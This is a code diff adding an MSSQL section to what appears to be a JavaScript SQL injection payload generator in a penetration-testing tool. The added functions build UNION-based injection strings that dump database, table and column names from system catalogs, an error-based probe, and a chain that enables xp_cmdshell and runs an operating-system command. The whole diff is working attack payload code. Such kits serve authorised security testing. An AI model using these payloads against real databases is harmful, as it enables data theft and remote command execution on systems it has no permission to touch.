@@ -232,6 +232,85 @@ window.Payload.SQLi = {
       )
     },
   },
+  MSSQL: {
+    unionSelect: ({ columns }) => {
+      columns = parseInt(columns)
+      if (isNaN(columns) === true) {
+        return ''
+      }
+
+      return 'union select ' + Array(columns).fill('null').join(',')
+    },
+
+    dumpDatabases: ({ columns, position }) => {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (
+        isNaN(columns) === true ||
+        isNaN(position) === true ||
+        position > columns
+      ) {
+        return ''
+      }
+
+      const fields = Array(columns).fill('null')
+      fields[position - 1] = "string_agg(name, ',')"
+
+      return 'union select ' + fields.join(',') + ' from sysdatabases'
+    },
+
+    dumpTables: ({ columns, position }) => {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (
+        isNaN(columns) === true ||
+        isNaN(position) === true ||
+        position > columns
+      ) {
+        return ''
+      }
+
+      const fields = Array(columns).fill('null')
+      fields[position - 1] = "string_agg(name, ',')"
+
+      return (
+        'union select ' +
+        fields.join(',') +
+        " from DB_NAME..sysobjects where xtype='u'"
+      )
+    },
+
+    dumpColumns: ({ columns, position }) => {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true) {
+        return ''
+      }
+
+      const fields = Array(columns).fill('null')
+      fields[position - 1] = "string_agg(name, ',')"
+
+      return (
+        'union select ' +
+        fields.join(',') +
+        " from DB_NAME..syscolumns where id in (select id from DB_NAME..sysobjects where xtype='u' and name='TABLE_NAME')"
+      )
+    },
+
+    errorBased: () => {
+      return 'user_name(@@version)'
+    },
+
+    cmdExec: () => {
+      return [
+        'exec sp_configure "show advanced options", 1;',
+        'reconfigure;',
+        'exec sp_configure "xp_cmdshell", 1;',
+        'reconfigure;',
+        'exec xp_cmdshell "whoami";',
+      ].join(' ')
+    },
+  },
 }
 
 window.Payload.XSS = {
